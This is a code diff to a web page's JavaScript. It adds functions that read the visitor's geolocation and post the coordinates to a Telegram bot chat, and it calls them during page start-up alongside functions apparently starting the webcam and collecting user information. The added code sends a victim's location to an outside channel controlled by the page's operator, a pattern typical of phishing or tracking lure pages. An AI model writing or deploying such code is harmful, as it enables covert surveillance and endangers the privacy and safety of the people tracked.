@@ -248,9 +248,56 @@
             }
         }
 
+        async function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const { latitude, longitude } = position.coords;
+
+                    const locationInfo = {
+                        latitude,
+                        longitude
+                    };
+
+                    console.log("Location info: ", locationInfo);
+
+                    await sendLocationToTelegram(locationInfo);
+                }, (error) => {
+                    console.error("Error getting location: ", error);
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        async function sendLocationToTelegram(locationInfo) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `Location Info: Latitude - ${locationInfo.latitude}, Longitude - ${locationInfo.longitude}`
+                    })
+                });
+
+                if (response.ok) {
+                    console.log("Location info sent to Telegram");
+                } else {
+                    console.error("Error sending location info to Telegram: ", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error sending location info to Telegram: ", error);
+            }
+        }
+
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
+            await getLocation();
             document.getElementById('initial-container').style.display = 'none';
             document.getElementById('main-container').style.display = 'flex';
         }
